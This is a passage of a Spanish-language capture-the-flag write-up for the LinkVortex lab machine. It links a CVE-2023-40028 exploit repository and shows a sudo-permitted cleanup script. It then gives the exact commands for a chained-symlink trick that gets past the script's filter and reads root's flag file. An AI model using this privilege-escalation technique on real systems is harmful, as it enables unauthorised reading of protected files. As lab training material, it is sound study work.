## Payload / CVE used
- 
-  https://github.com/0xyassine/CVE-2023-40028/tree/master

---

## Lateral Movement

### Local enumeration

# Sudo -l
```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

```

Clean_symlink.sh:

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi

```


tras varios intentos consigo que me haga el cat al archivo 
```bash
bob@linkvortex:~$ nano /var/quarantined/g.png
bob@linkvortex:~$ sudo CHECK_CONTENT="true" /bin/bash /opt/ghost/clean_symlink.sh g.png 
bob@linkvortex:~$ ln -s hello.txt g.png
bob@linkvortex:~$ sudo CHECK_CONTENT="true" /bin/bash /opt/ghost/clean_symlink.sh g.png 
Link found [ g.png ] , moving it to quarantine
Content:
holaaaaa

```
El metodo es creando un archivo en /var/quarantined con el contenido que se quiera leer previo a crear el symlynk y si la variable $CHECK_CONTENT es true entonces hace un cat al  `QUAR_DIR/LINK_NAME`

entonces

creamos un symlink de /root/root.txt a un archivo en quarentined
```bash
ln -s /root/root.txt /var/quarentined/noleer.txt
```

Creamos un Symlink del noleer al directorio de usuario 
```bash
ln -s /var/quarentined/noleer.txt noleer.png
```

finalmente ejecutamos el script con sudo y marando $CHECK_CONTENT=true
```bash
bob@linkvortex:~$ sudo CHECK_CONTENT="true" /usr/bin/bash /opt/ghost/clean_symlink.sh noleer.png 
Link found [ noleer.png ] , moving it to quarantine
Content:
daa21fbc128199ee668e1b1bee29d6b9
```

### Atack vector

- 

---

